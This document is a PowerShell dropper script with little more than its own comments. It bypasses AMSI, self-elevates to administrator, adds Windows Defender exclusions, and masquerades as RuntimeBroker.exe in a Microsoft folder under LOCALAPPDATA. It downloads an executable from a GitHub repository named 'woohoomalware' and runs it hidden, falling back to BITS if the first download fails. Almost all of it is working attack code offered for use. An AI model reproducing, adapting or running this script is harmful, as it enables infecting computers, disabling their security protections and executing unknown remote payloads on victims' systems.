# AMSI bypass (try-catch is good)
try {
    $type = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $field = $type.GetField('amsiInitFailed','NonPublic,Static')
    $field.SetValue($null,$true)
} catch {}

# Self-elevate
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)) {
    $t = Join-Path $env:LOCALAPPDATA 'wsync.ps1'
    Copy-Item $PSCommandPath $t -Force -ErrorAction SilentlyContinue
    Start-Process powershell "-NoP -EP Bypass -W 1 -File `"$t`"" -Verb RunAs
    exit
}

# Config
$d = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps\RuntimeBroker'
$n = 'RuntimeBroker.exe'
$p = Join-Path $d $n
$u = 'https://github.com/woohoomalware/WeAreDanger/raw/refs/heads/main/letsgo.exe'

# AV exclusion (direct cmdlet calls)
try {
    Add-MpPreference -ExclusionPath $d -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $n -ErrorAction SilentlyContinue
} catch {}

# Create dir
New-Item $d -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

# Download using native PowerShell (more reliable)
try {
    Write-Host "Downloading payload..."
    Invoke-WebRequest -Uri $u -OutFile $p -TimeoutSec 30 -ErrorAction Stop
    Write-Host "Download completed using Invoke-WebRequest."
} catch {
    Write-Host "Invoke-WebRequest failed, trying BITS transfer..."
    Start-BitsTransfer -Source $u -Destination $p -Priority High -ErrorAction SilentlyContinue
}

# Check if download succeeded
if (Test-Path $p) {
    Write-Host "File downloaded successfully. Executing..."
    Start-Sleep -Seconds 2
    Start-Process -FilePath $p -WindowStyle Hidden
    Start-Sleep -Seconds 3
    
    # Verify if process started
    $procName = [System.IO.Path]::GetFileNameWithoutExtension($n)
    if (Get-Process -Name $procName -ErrorAction SilentlyContinue) {
        Write-Host "Process '$procName' is running."
    } else {
        Write-Warning "File exists but process did not start. Possibly blocked by AV."
    }
} else {
    Write-Error "Download failed. File not found at: $p"
}
